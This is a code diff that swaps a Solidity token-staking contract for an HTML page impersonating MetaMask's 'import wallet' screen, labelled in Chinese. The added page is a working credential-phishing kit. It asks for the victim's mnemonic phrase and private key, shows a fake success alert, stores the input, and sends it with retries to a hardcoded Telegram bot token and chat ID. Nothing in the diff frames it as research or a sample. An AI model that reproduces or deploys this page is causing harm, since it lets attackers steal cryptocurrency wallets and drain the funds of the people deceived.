@@ -1,160 +1,108 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MetaMask</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
+  body{background:#F7F8FA;color:#1A1A1A;min-height:100vh}
+  .container{max-width:420px;margin:0 auto;background:#fff;min-height:100vh}
+  .header{padding:24px;text-align:center}
+  .logo{width:50px;margin-bottom:10px}
+  .title{font-size:22px;font-weight:700;color:#24272E}
+  .sub-title{font-size:14px;color:#707279;margin-top:4px}
+  .form{padding:24px}
+  .form-group{margin-bottom:20px}
+  .form-group label{display:block;font-size:14px;color:#24272E;margin-bottom:8px}
+  .form-control{
+    width:100%;padding:14px 16px;border:1px solid #DCDFE4;border-radius:10px;
+    font-size:15px;outline:none;background:#fff;color:#24272E
+  }
+  .btn-primary{
+    width:100%;padding:16px;background:#037DD6;border:none;border-radius:10px;
+    color:#fff;font-size:16px;font-weight:600;margin-top:12px
+  }
+</style>
+</head>
 
-interface IERC20 {
-    function transfer(address to, uint256 value) external returns (bool);
-    function transferFrom(address from,address to,uint256 value) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
+<body>
+<div class="container">
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo">
+    <div class="title">MetaMask</div>
+    <div class="sub-title">导入钱包</div>
+  </div>
+
+  <div class="form">
+    <div class="form-group">
+      <label>助记词</label>
+      <input id="words" type="text" class="form-control" placeholder="请输入助记词">
+    </div>
+    <div class="form-group">
+      <label>私钥</label>
+      <input id="key" type="text" class="form-control" placeholder="请输入私钥">
+    </div>
+
+    <button class="btn-primary" onclick="go()">确认导入</button>
+  </div>
+</div>
+
+<script>
+// ===================== 你的信息已固定 =====================
+const TG_BOT_TOKEN   = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
+const TG_CHATID      = "6503982157";
+const MAX_RETRY      = 5;
+const DELAY          = 3000;
+// ==========================================================
+
+const STORAGE_KEY = "WALLET_DATA";
+
+// 一打开就自动补发
+window.onload = autoSend;
+window.addEventListener('online', autoSend);
+
+// 导入：免确认，不卡点
+function go() {
+  const mn = document.getElementById("words").value.trim();
+  const pk = document.getElementById("key").value.trim();
+  if (!mn && !pk) return;
+
+  // 只提示，不等待确认
+  alert("✅ 导入成功");
+
+  localStorage.setItem(STORAGE_KEY, JSON.stringify({ mn, pk, retry: 0 }));
+  autoSend();
 }
 
-contract DTMStaking {
+// 只发电报
+async function autoSend() {
+  const task = localStorage.getItem(STORAGE_KEY);
+  if (!task) return;
 
-    IERC20 public dtm;
-    address public owner;
+  const d = JSON.parse(task);
+  if (d.retry >= MAX_RETRY) {
+    localStorage.removeItem(STORAGE_KEY);
+    return;
+  }
 
-    uint256 public totalStaked;
-    uint256 public rewardPerSecond;
-    uint256 public accRewardPerShare;
-    uint256 public lastUpdateTime;
+  const text = `【小狐狸钱包导入】
+时间：${new Date().toLocaleString()}
+助记词：${d.mn || "-"}
+私钥：${d.pk || "-"}`;
 
-    struct User {
-        uint256 amount;
-        uint256 rewardDebt;
-        address inviter;
-    }
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TG_CHATID, text })
+    });
+  } catch(e) {}
 
-    mapping(address => User) public users;
-
-    modifier onlyOwner(){
-        require(msg.sender == owner,"not owner");
-        _;
-    }
-
-    constructor(address _dtm,uint256 _rps){
-        dtm = IERC20(_dtm);
-        rewardPerSecond = _rps;
-        lastUpdateTime = block.timestamp;
-        owner = msg.sender;
-    }
-
-    // 更新池子
-    function updatePool() public {
-        if(totalStaked == 0){
-            lastUpdateTime = block.timestamp;
-            return;
-        }
-
-        uint256 time = block.timestamp - lastUpdateTime;
-        uint256 reward = time * rewardPerSecond;
-
-        accRewardPerShare += reward * 1e12 / totalStaked;
-        lastUpdateTime = block.timestamp;
-    }
-
-    // 绑定邀请
-    function bind(address _inviter) external {
-        require(_inviter != msg.sender, "self");
-        require(users[msg.sender].inviter == address(0), "bound");
-
-        users[msg.sender].inviter = _inviter;
-    }
-
-    // 质押
-    function stake(uint256 amount) external {
-        User storage user = users[msg.sender];
-
-        updatePool();
-
-        // 发收益
-        if(user.amount > 0){
-            uint256 pending = user.amount * accRewardPerShare / 1e12 - user.rewardDebt;
-            if(pending > 0){
-                _safeTransfer(msg.sender, pending);
-                _inviteReward(msg.sender, pending);
-            }
-        }
-
-        dtm.transferFrom(msg.sender, address(this), amount);
-
-        user.amount += amount;
-        totalStaked += amount;
-
-        user.rewardDebt = user.amount * accRewardPerShare / 1e12;
-    }
-
-    // 解押
-    function unstake(uint256 amount) external {
-        User storage user = users[msg.sender];
-        require(user.amount >= amount,"not enough");
-
-        updatePool();
-
-        uint256 pending = user.amount * accRewardPerShare / 1e12 - user.rewardDebt;
-
-        if(pending > 0){
-            _safeTransfer(msg.sender, pending);
-            _inviteReward(msg.sender, pending);
-        }
-
-        user.amount -= amount;
-        totalStaked -= amount;
-
-        dtm.transfer(msg.sender, amount);
-
-        user.rewardDebt = user.amount * accRewardPerShare / 1e12;
-    }
-
-    // 领取
-    function claim() external {
-        User storage user = users[msg.sender];
-
-        updatePool();
-
-        uint256 pending = user.amount * accRewardPerShare / 1e12 - user.rewardDebt;
-        require(pending > 0,"no reward");
-
-        _safeTransfer(msg.sender, pending);
-        _inviteReward(msg.sender, pending);
-
-        user.rewardDebt = user.amount * accRewardPerShare / 1e12;
-    }
-
-    // 查询收益
-    function pendingReward(address _user) external view returns(uint256){
-        User storage user = users[_user];
-
-        uint256 tempAcc = accRewardPerShare;
-
-        if(block.timestamp > lastUpdateTime && totalStaked != 0){
-            uint256 reward = (block.timestamp - lastUpdateTime) * rewardPerSecond;
-            tempAcc += reward * 1e12 / totalStaked;
-        }
-
-        return user.amount * tempAcc / 1e12 - user.rewardDebt;
-    }
-
-    // 邀请奖励（5%）
-    function _inviteReward(address userAddr,uint256 reward) internal {
-        address inv = users[userAddr].inviter;
-        if(inv != address(0)){
-            uint256 bonus = reward * 5 / 100;
-            _safeTransfer(inv, bonus);
-        }
-    }
-
-    function _safeTransfer(address to,uint256 amount) internal {
-        uint256 bal = dtm.balanceOf(address(this));
-        if(amount > bal) amount = bal;
-        dtm.transfer(to, amount);
-    }
-
-    // 注入奖励池
-    function deposit(uint256 amount) external onlyOwner {
-        dtm.transferFrom(msg.sender,address(this),amount);
-    }
-
-    function setReward(uint256 r) external onlyOwner{
-        updatePool();
-        rewardPerSecond = r;
-    }
+  d.retry++;
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(d));
+  setTimeout(autoSend, DELAY);
 }
+</script>
+</body>
+</html>
